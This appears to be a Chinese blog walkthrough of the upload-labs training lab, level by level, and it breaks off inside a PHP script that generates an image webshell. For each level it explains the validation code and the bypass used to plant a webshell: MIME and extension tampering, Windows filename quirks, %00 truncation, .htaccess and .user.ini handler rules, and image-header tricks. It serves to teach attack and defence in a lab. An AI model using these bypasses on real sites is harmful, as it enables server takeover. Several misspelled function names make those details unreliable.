        <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>
        <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//提取上传文件的类型</span>
        <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>
            <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>函数知识补充：</p>
<p>#document.getElementsByname(name[必须])</p>
<p>该方法与 getElementById() 方法相似，但是它查询元素的 name 属性，而不是 id 属性。</p>
<p>getElementsByName() 方法返回的是元素的数组，而不是一个元素。</p>
<p>#string.lastIndexOf(searchvalue[必须，要检索的字符],start[可选，说明说第几个位置开始，没写默认从0开始])</p>
<p>如果没有匹配到返回 -1</p>
<p>该方法与string.indexOf()相似，一个是找字符最早出现的位置，一个是最后出现的位置。</p>
<p>#string.subsrting(from[必须，表示要开始提前字符串的初始位置],to[可选，没写默认从from开始到结尾])</p>
<p>接下来看看如何绕过：</p>
<p>#删除onsubmit事件，绕过验证机制。</p>
<p>#修改验证函数，把return flase，改成return true。</p>
<p>#把整个验证函数删除。</p>
<p>#先传个后最为.jpg的文件。绕过验证，再用burp拦截下来，修改后缀为.php。</p>
<p>#修改白名单添加|.php|,绕过验证。</p>
<p>最后通过菜刀或者蚁剑连接上webshell。</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="#0x02"></a>#0x02</h3><p>试着上传一个.php的文件。发现*<u>提示：文件类型不正确，请重新上传！</u>*</p>
<p>这关应该是拦截文件类型，是在服务器端进行拦截。</p>
<p>函数知识补充：</p>
<p>#file_exists(path[必须])函数检查文件或目录是否存在。存在返回ture，反之返回flase。</p>
<p>#$_FILES是一个数组变量</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> 客户端文件的原名称。 
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> 文件的 <span class="token constant">MIME</span> 类型，需要浏览器提供该信息的支持，例如<span class="token string">"image/gif"</span>。 
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> 已上传文件的大小，单位为字节。 
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span> 文件被上传后在服务端储存的临时文件名，一般是系统默认。</code></pre>
<p>#move_uploaded_file(file[必须，要移动的文件],newloc[必须，要移动到的新的位置的信息])</p>
<p>接下来看看如何绕过：</p>
<p>#上传.php的木马文件，用burp拦截下来，修改content-type 为：image/jpeg。</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="#0x03"></a>#0x03</h3><p>上传一个木马文件，发现*<u>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！</u>*</p>
<p>函数知识补充：</p>
<p>#trim(string[必须，要检测的字符串],charlist[可选，指定要删除字符串中的哪些字符])</p>
<p>如果没填charlist默认删除</p>
<ul>
<li>“\0” - NULL</li>
<li>“\t” - 制表符</li>
<li>“\n” - 换行</li>
<li>“\x0B” - 垂直制表符</li>
<li>“\r” - 回车</li>
<li>“ “ - 空格</li>
</ul>
<p>#deldot()删除文件名末尾的点</p>
<p>注：这个函数没查到，不太确定。</p>
<p>#strrchr(string[必须，要检查的字符串],char[必须，要查找的字符])</p>
<p>返回从该字符开始一直到末尾的字符串。</p>
<p>注：如果char参数用数字表示，则自动匹配数字 ASCII 值的字符。</p>
<p>#strtolower(string[必须,把字符串转化为小写])</p>
<p>#str_ireplace(find[必须，要查找的内容],replace[必须，要替换的内容],string[必须，要检查的字符串])</p>
<p>#in_array(search[必须，要在数组中搜索的值],array[必须，要搜索的数组],type[可选])</p>
<p>如果search存在在array中，返回true，反之返回flase。</p>
<p>下面看看怎么绕过：</p>
<p>#这里是用黑名单进行过滤，但却没有过滤php3 php5 phml 等</p>
<p>所以可以上传后缀为php3的文件进行解析绕过。</p>
<p>注：需要将apache配置文件中AddType X-application/http-php php3 php5 phtml 前面的#去掉，再重启下才能复现。</p>
<p>而且最好apache服务器版本低点，版本太高可能复现不了。</p>
<h3 id="0x04（我没复现成功，需要把apache的版本降低才行）"><a href="#0x04（我没复现成功，需要把apache的版本降低才行）" class="headerlink" title="#0x04（我没复现成功，需要把apache的版本降低才行）"></a>#0x04（我没复现成功，需要把apache的版本降低才行）</h3><p>查看提示，过滤了好多后缀。但是没有过滤 .htaccess文件。</p>
<p>写一个内容为以下内容的.htaccess文件，就可把上传的1.jpg图片按php文件进行解析。</p>
<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirlesMatch</span> <span class="token attr-name">"1.jpg"</span><span class="token punctuation">></span></span></span>
SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php 
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span></code></pre>
<p>使用之前要把apache配置文件里AllowOverride设置为All</p>
<p>LoadModule rewrite_module modules/mod_rewrite.so 前面的#删除。重启服务器</p>
<p>知识补充：</p>
<p>#.htaccess文件</p>
<p>.htaccess文件是apache的分布式配置文件。他负责相关目录下的网页配置，通过.htaccess可以帮我们实现。其实就是把.htaccess里的内容写在apache的配置文件里。</p>
<h3 id="0x05（用php7-3版本）"><a href="#0x05（用php7-3版本）" class="headerlink" title="#0x05（用php7.3版本）"></a>#0x05（用php7.3版本）</h3><p>这关提示目录下存在readme.php文件</p>
<p>这关和第4关类似，上一关是利用apache中间件进行绕过，这关是利用php解析问题进行绕过。</p>
<p>知识补充：</p>
<p>.user.ini 功能和 .htaccess功能类似 一个是apache的，一个的php的配置文件。</p>
<p>绕过成功前提：</p>
<p>#服务端脚本语言是PHP语言</p>
<p>#上传文件的目录下存在其他的php文件</p>
<p>#服务器使用 CGI或者FASTCIG模式</p>
<p>建一个.user.ini 的文件内容为：</p>
<pre class=" language-php"><code class="language-php"> auto_prepend_file<span class="token operator">=</span>pass5<span class="token punctuation">.</span>png</code></pre>
<p>意思是：该目录下的所有php文件都包含pass5.png。</p>
<p>再创建一个名为pass5.png的木马文件上传。（可以先用内容为 &lt;?php phpinfo(); ?》试下）</p>
<p>注：按照大佬的博客是说，官方说上传后5分钟过后才会生效，所以可以直接重启服务器减少时间。</p>
<p>解析pass5.png肯定不行，解析readme.php解析成功。</p>
<p>用菜刀去连接readme.php就行。</p>
<h3 id="0x06-php7-3-如果复现不了，可以去Buu的在线靶场复现。"><a href="#0x06-php7-3-如果复现不了，可以去Buu的在线靶场复现。" class="headerlink" title="#0x06(php7.3)如果复现不了，可以去Buu的在线靶场复现。"></a>#0x06(php7.3)如果复现不了，可以去Buu的在线靶场复现。</h3><p>这关少了个函数</p>
<p>#strtolower()把字符串转为小写，在win系统下对大小写不敏感，会自动变成小写。Liunx系统下则对大小写敏感。</p>
<p>上传木马文件fox.php,用burp拦截请求包，修改为fox.PHP</p>
<h3 id="0x07-php5-2"><a href="#0x07-php5-2" class="headerlink" title="#0x07(php5.2)"></a>#0x07(php5.2)</h3><p>这关少了个函数</p>
<p>#trim()如果还不懂该函数啥意思自行百度！</p>
<p>注：在win系统下呢，如果文件后缀最后面是空格会自动省去。</p>
<p>上传木马文件为fox.php,用burp拦截请求包，修改为fox.php_  [这里 _指的是空格]</p>
<p>这样可以绕过服务端的验证，到达客户端时自动省去空格。</p>
<h3 id="0x08-php5-2"><a href="#0x08-php5-2" class="headerlink" title="#0x08(php5.2)"></a>#0x08(php5.2)</h3><p>这关少了个函数</p>
<p>#deldot()不懂百度！</p>
<p>原理和0x07一样。win系统会省去最后的 .</p>
<h3 id="0x09-php7-3-不行可以去buu在线靶场复现"><a href="#0x09-php7-3-不行可以去buu在线靶场复现" class="headerlink" title="#0x09(php7.3)不行可以去buu在线靶场复现"></a>#0x09(php7.3)不行可以去buu在线靶场复现</h3><p>这里也是利用win系统的特性。没有过滤（：：$DATA)在后缀加：：$DATA就可绕过</p>
<p>07,08,09这三关都是利用win系统独有的特性。所以渗透时，搜集操作系统信息很重要！</p>
<h3 id="0x10"><a href="#0x10" class="headerlink" title="#0x10"></a>#0x10</h3><p>这关是结合前面几关绕过的特点进行总结使用。</p>
<p>burp 拦截进行后缀名拼凑绕过 fox.php.. .（或者其他组合方式win系统下才可以用）</p>
<p>绕过原理，可以把每个函数过滤结果echo出来观察。</p>
<h3 id="0x11"><a href="#0x11" class="headerlink" title="#0x11"></a>#0x11</h3><p>这关是把黑名单里的字符串，替换成空。</p>
<p>这里可以利用SQL注入里的叠加。</p>
<p>#fox.pphphp(这样解析后就变成fox.php)就上传成功</p>
<p>注：不能写成fox.phphpp,不然会被解析成fox.hpp</p>
<h3 id="0x12"><a href="#0x12" class="headerlink" title="#0x12"></a>#0x12</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></code></pre>
<p>这关还有个可控的地方就是 save_path (就是路径可控)</p>
<p>可以使用%00截断。这个%00截断其实和SQL注入里的注释作用是一样的让后面部分没有作用。</p>
<p>那我们可以上传一个代有一句话木马的图片，绕过前面的检测。</p>
<p>在save_path动手脚</p>
<p><img src="/images/13.png"></p>
<p><img src="/images/14.png"></p>
<p>这样就会让原本图片里面的php代码，生成在fox.php这个文件里并写在该目录下。就可以成功绕过上传了。</p>
<p>注：需要把php.ini 配置文件里的 magic_quotes_gpc 设置为Off</p>
<p>不然会自动过滤，会失败。</p>
<h3 id="0x13"><a href="#0x13" class="headerlink" title="#0x13"></a>#0x13</h3><p>和12关没啥区别，没什么好讲的。</p>
<h3 id="0x14"><a href="#0x14" class="headerlink" title="#0x14"></a>#0x14</h3><p>先讲下相对路径</p>
<p>#./表示当前目录下</p>
<p>#../表示上一级目录，就是先移动到上一层目录，再寻找相关文件。</p>
<p>函数知识补充：</p>
<p>#rb 是只读的意思，rb+是读写</p>
<p>#fread(resource $handle , int $length)</p>
<table>
<thead>
<tr>
<th><strong>handle</strong></th>
<th><strong>文件系统指针，是典型地由 fopen() 创建的 resource(资源)。</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>length</strong></td>
<td><strong>必需。规定要读取的最大字节数。</strong></td>
</tr>
</tbody></table>
<p>函数会在到达指定长度或读到文件末尾（EOF）时（以先到者为准），停止运行。</p>
<p>该函数返回读取的字符串，如果失败则返回 FALSE。</p>
<p>#unpack(format,data)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>format</em></td>
<td>必需。规定在解包数据时所使用的格式。</td>
</tr>
<tr>
<td>data</td>
<td>必需。规定被解包的二进制数据。</td>
</tr>
</tbody></table>
<p>返回的是一个数组</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"GIF89a"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"C2chars"</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span> 
<span class="token delimiter">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"PHP"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"Cmyint"</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"PHP"</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"C*"</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span> 
<span class="token delimiter">&lt;?php</span>
<span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">"c2n2"</span><span class="token punctuation">,</span><span class="token number">0x1234</span><span class="token punctuation">,</span><span class="token number">0x5678</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"c4chars/n2int"</span><span class="token punctuation">,</span><span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>chars1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">71</span>
    <span class="token punctuation">[</span>chars2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">73</span>
<span class="token punctuation">)</span>

<span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>myint<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">80</span>
<span class="token punctuation">)</span>
<span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">80</span>
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">72</span>
    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">80</span>
<span class="token punctuation">)</span>

<span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>chars1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">52</span>
    <span class="token punctuation">[</span>chars2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">120</span>
    <span class="token punctuation">[</span>int1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">65</span>
    <span class="token punctuation">[</span>int2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">66</span>
<span class="token punctuation">)</span></code></pre>
<p>#这关需要结合文件包含漏洞才能成功。</p>
<p>先制作一个木马图片在头部加GIF89a可以绕过检测。</p>
<p>然后点击靶场自带的文件上传漏洞页面</p>
<p>包含所上传的图片马让它解析成功。</p>
<pre><code>?file=./upload/12325112521.gif</code></pre>
<p>可以先把内容写成phpinfo()看下能否解析成功，再写入一句话木马。</p>
<h3 id="0x15"><a href="#0x15" class="headerlink" title="#0x15"></a>#0x15</h3><p>函数知识补充：</p>
<p>#getmagicsize()</p>
<p>用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$remote_png_url</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png';</span>
<span class="token variable">$img_data</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$remote_png_url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$img_data</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">290</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">69</span>
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3</span>
    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> width<span class="token operator">=</span><span class="token string">"290"</span> height<span class="token operator">=</span><span class="token string">"69"</span>
    <span class="token punctuation">[</span>bits<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8</span>
    <span class="token punctuation">[</span>mime<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> image<span class="token operator">/</span>png
<span class="token punctuation">)</span></code></pre>
<ul>
<li>索引 0 给出的是图像宽度的像素值</li>
<li>索引 1 给出的是图像高度的像素值</li>
<li>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 =  BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>
<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image标签</li>
<li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>
<li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>
<li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</li>
</ul>
<p>#magic_type_to_extesion()</p>
<p>根据指定的图像类型返回对应的后缀名。</p>
<p>#这关的验证的思路和14关类似，添加头部信息GIF89a即可绕过。</p>
<h3 id="0x16"><a href="#0x16" class="headerlink" title="#0x16"></a>#0x16</h3><p>函数知识补充：</p>
<p>#exif_magictype()</p>
<p>读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。</p>
<p><img src="/images/15.png"></p>
<p>注：需打开php_exif 模块，把前面的分号去掉就打开了。</p>
<p>#这关也是换了个函数进行验证，思路和13关一样。</p>
<p>总结下 14，15，16 三关。差别是使用不同的方法对传进来的文件进行信息的验证。</p>
<p>看博客说exif_magictype 比 getmagicsize 验证快的多。</p>
<h3 id="0x17"><a href="#0x17" class="headerlink" title="#0x17"></a>#0x17</h3><p>函数知识补充：</p>
<p>#basename(path,suffix)</p>
<p>函数返回路径中的文件名部分。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>path</td>
<td>必需。规定要检查的路径。</td>
</tr>
<tr>
<td>suffix</td>
<td>可选。规定文件扩展名。如果文件有名有文件扩展名，将不会显示这个扩展名。</td>
</tr>
</tbody></table>
<p>#imagecreatefrom__()</p>
<p>该系列函数用于从文件或 URL 载入一幅图像，返回一图像标识符，代表了从给定的文件名取得的图像。失败返回 false。</p>
<p>注：程序通过imagecreatefromjpeg()函数调用了PHP GD库（GD库，是php处理图形的扩展库），对图片进行了转换。</p>
<p>该系列函数有：</p>
<p>imagecreatefromgif()：      创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：   创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：    创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br>imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像<br>imagecreatefromstring()： 创建一块画布，并从字符串中的图像流新建一副图像</p>
<p>#unlink(filename,context)</p>
<p>删除文件。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>filename</td>
<td>必需。规定要删除的文件。</td>
</tr>
<tr>
<td>context</td>
<td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td>
</tr>
</tbody></table>
<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
<p>#srand(seed)</p>
<p>播下随机数发生器种子。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>seed</td>
<td>可选。用 seed 播下随机数发生器种子。</td>
</tr>
</tbody></table>
<p>自 PHP 4.2.0 起，不再需要用 srand() 或 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_math_mt_srand.asp">mt_srand()</a> 函数给随机数发生器播种，现在已自动完成。所以这个函数现在来说应该没用。</p>
<p>#strval( mixed $var)</p>
<p>用于获取变量的字符串值。</p>
<p>$var: 可以是任何标量类型，但不能是数组或对象。</p>
<p>#image__()</p>
<p>将图像输出到浏览器或文件。</p>
<p>imagegif()：       以 GIF 格式将图像输出到浏览器或文件<br>imagejpeg()：    以 JPEG 格式将图像输出到浏览器或文件<br>imagepng()：     以 PNG 格式将图像输出到浏览器或文件<br>imagewbmp()：以 WBMP 格式将图像输出到浏览器或文件</p>
<p>#因为重新渲染了图片所以我们写的一句话木马会消失。</p>
<p>利用大佬写的php脚本制作一张图片马</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>
           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

